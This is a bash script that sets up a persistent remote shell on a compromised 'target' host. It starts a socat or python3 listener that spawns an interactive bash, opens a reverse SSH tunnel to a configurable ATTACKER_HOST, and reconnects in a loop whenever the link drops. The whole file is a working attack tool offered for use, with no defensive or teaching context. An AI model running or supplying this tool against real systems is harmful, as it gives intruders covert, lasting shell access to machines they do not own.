#!/usr/bin/env bash
#===============================================================================
# reverse-ssh-netcat.sh - Reverse tunnel to a netcat/socat shell listener
#===============================================================================
# This script starts a local listener on the target that spawns a shell,
# then creates a reverse SSH tunnel to forward the attacker's port to it.
#
# Usage:
#   ./reverse-ssh-netcat.sh [-c CONFIG] [-v] [-h]
#
#===============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="$SCRIPT_DIR/target.env"
LOG_LEVEL_INFO=1
LOG_LEVEL_DEBUG=0
LOG_LEVEL=$LOG_LEVEL_INFO

log() {
    local level="$1"; shift
    local msg="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    if [[ $level == "DEBUG" && $LOG_LEVEL -gt $LOG_LEVEL_DEBUG ]]; then
        return
    fi
    echo "[$timestamp] [$level] $msg"
}

usage() {
    cat <<EOF
Usage: $0 [options]

Options:
  -c CONFIG   Path to config file (default: ./target.env)
  -v          Verbose debug logging
  -h          Show help
EOF
    exit 0
}

while getopts "c:vh" opt; do
    case "$opt" in
        c) CONFIG_FILE="$OPTARG" ;;
        v) LOG_LEVEL=$LOG_LEVEL_DEBUG ;;
        h) usage ;;
    esac
done

if [[ -f "$CONFIG_FILE" ]]; then
    # shellcheck disable=SC1090
    source "$CONFIG_FILE"
else
    log "WARN" "Config file $CONFIG_FILE not found. Using environment variables."
fi

# Validate required variables
for var in ATTACKER_USER ATTACKER_HOST ATTACKER_PORT SSH_KEY REMOTE_FORWARD_PORT; do
    if [[ -z "${!var:-}" ]]; then
        log "ERROR" "Required variable '$var' is not set."
        exit 1
    fi
done

if [[ ! -f "$SSH_KEY" ]]; then
    log "ERROR" "SSH key not found: $SSH_KEY"
    exit 1
fi

chmod 600 "$SSH_KEY"

# Configuration for local listener
LISTENER_PORT="${TARGET_NC_PORT:-4445}"   # Local port on target
LISTENER_HOST="${TARGET_NC_HOST:-localhost}"

# Check for socat or python3
if command -v socat >/dev/null 2>&1; then
    log "INFO" "Using socat for shell listener on port $LISTENER_PORT"
    LISTENER_CMD="socat TCP-LISTEN:${LISTENER_PORT},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
elif command -v python3 >/dev/null 2>&1; then
    log "INFO" "Using python3 for shell listener on port $LISTENER_PORT"
    LISTENER_CMD="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"${LISTENER_HOST}\",${LISTENER_PORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
else
    log "ERROR" "Neither socat nor python3 found. Cannot create shell listener."
    exit 1
fi

# Start listener in background
log "INFO" "Starting shell listener..."
eval "$LISTENER_CMD" &
LISTENER_PID=$!

# Cleanup on exit
cleanup() {
    log "INFO" "Stopping listener (PID $LISTENER_PID)..."
    kill "$LISTENER_PID" 2>/dev/null || true
    log "INFO" "Reverse tunnel stopped."
}
trap cleanup EXIT INT TERM

# Build SSH command with reverse forward
log "INFO" "Starting reverse SSH tunnel for shell access..."
SSH_CMD=(
    ssh
    -i "$SSH_KEY"
    -N
    -R "${REMOTE_FORWARD_PORT}:${LISTENER_HOST}:${LISTENER_PORT}"
    -o "ServerAliveInterval=${SERVER_ALIVE_INTERVAL:-60}"
    -o "ServerAliveCountMax=${SERVER_ALIVE_COUNT_MAX:-3}"
    -o "ExitOnForwardFailure=yes"
    -o "StrictHostKeyChecking=accept-new"
    -o "UserKnownHostsFile=${SCRIPT_DIR}/known_hosts"
    -o "LogLevel=ERROR"
    -q
    -p "${ATTACKER_PORT}"
)

if [[ -n "${SSH_OPTIONS:-}" ]]; then
    # shellcheck disable=SC2206
    SSH_CMD+=($SSH_OPTIONS)
fi

SSH_CMD+=("${ATTACKER_USER}@${ATTACKER_HOST}")

# Retry loop
while true; do
    log "INFO" "Attempting to establish reverse shell tunnel..."
    "${SSH_CMD[@]}"
    log "WARN" "SSH connection lost. Retrying in 10 seconds..."
    sleep 10
done